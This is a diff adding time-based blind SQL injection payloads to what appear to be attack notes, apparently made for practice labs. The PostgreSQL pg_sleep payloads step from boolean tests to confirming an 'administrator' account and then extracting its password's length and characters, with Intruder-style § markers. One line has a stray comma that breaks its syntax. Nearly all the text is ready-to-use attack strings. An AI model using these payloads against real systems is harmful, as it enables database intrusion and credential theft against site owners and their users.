@@ -80,9 +80,22 @@ MSSQL → ' WAITFOR DELAY '0:0:10'--
 
 
 
+with time delays and information retrieval
 
 
+first
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- 
+'||(SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
 
+
+2-)
+'||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--
+
+3-)
+'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)>,§1§) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--
+
+4-)
+'||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--
 
 
 
